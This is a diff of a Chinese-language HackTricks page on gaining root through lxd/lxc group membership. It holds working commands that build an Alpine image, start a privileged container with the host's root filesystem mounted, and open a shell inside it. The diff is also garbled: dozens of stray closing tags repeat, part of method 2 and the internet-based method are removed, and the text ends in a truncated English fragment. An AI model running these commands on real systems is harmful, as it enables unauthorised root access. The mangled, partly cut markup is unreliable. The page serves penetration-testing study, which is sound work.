@@ -1,26 +1,50 @@
-# lxd/lxc Group - 提权
+# lxd/lxc 组 - 权限提升
+
+{% hint style="success" %}
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>
+<summary>支持 HackTricks</summary>
 
-支持HackTricks的其他方式：
-
-* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
-* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
-* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
 
-如果您属于_lxd_ **或** _lxc_ **组**，您可以成为root
+如果你属于 _**lxd**_ **或** _**lxc**_ **组**，你可以成为 root
 
-## 在没有互联网的情况下利用
+## 无需互联网的利用
 
-### 方法1
+### 方法 1
 
-您可以在您的计算机上安装此发行版构建工具：[https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)（按照github上的说明操作）:
+你可以在你的机器上安装这个发行版构建工具：[https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)（按照 GitHub 的说明进行操作）：
 ```bash
 sudo su
 #Install requirements
@@ -38,7 +62,7 @@ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 #Create the container
 sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
 ```
-上传文件 **lxd.tar.xz** 和 **rootfs.squashfs**，将图像添加到存储库并创建一个容器：
+上传文件 **lxd.tar.xz** 和 **rootfs.squashfs**，将镜像添加到仓库并创建一个容器：
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -54,11 +78,11 @@ lxc list
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
 {% hint style="danger" %}
-如果你遇到这个错误 _**Error: No storage pool found. Please create a new storage pool**_\
-运行 **`lxd init`** 然后**重复**之前的命令块
+如果您发现此错误 _**错误：未找到存储池。请创建一个新的存储池**_\
+运行 **`lxd init`** 并 **重复** 之前的命令块
 {% endhint %}
 
-最后，你可以执行容器并获取 root 权限：
+最后，您可以执行容器并获取 root：
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
@@ -66,7 +90,7 @@ lxc exec privesc /bin/sh
 ```
 ### 方法 2
 
-构建一个 Alpine 镜像，并使用标志 `security.privileged=true` 启动它，强制容器以 root 用户的身份与主机文件系统交互。
+构建一个 Alpine 镜像并使用标志 `security.privileged=true` 启动它，强制容器以 root 身份与主机文件系统交互。
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
@@ -86,35 +110,65 @@ lxc init myimage mycontainer -c security.privileged=true
 # mount the /root into the image
 lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
 
-# interact with the container
-lxc start mycontainer
-lxc exec mycontainer /bin/sh
-```
-## 通过互联网
-
-您可以按照[这些说明](https://reboare.github.io/lxd/lxd-escape.html)。
-```bash
-lxc init ubuntu:16.04 test -c security.privileged=true
-lxc config device add test whatever disk source=/ path=/mnt/root recursive=true
-lxc start test
-lxc exec test bash
-[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
-```
-## 参考资料
-
-* [https://reboare.github.io/lxd/lxd-escape.html](https://reboare.github.io/lxd/lxd-escape.html)
-* [https://etcpwd13.github.io/greyfriar_blog/blog/writeup/Notes-Included/](https://etcpwd13.github.io/greyfriar_blog/blog/writeup/Notes-Included/)
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-支持HackTricks的其他方式：
-
-* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF版本的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
-* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+
+{% endhint %}
+</details>
+{% endhint %}
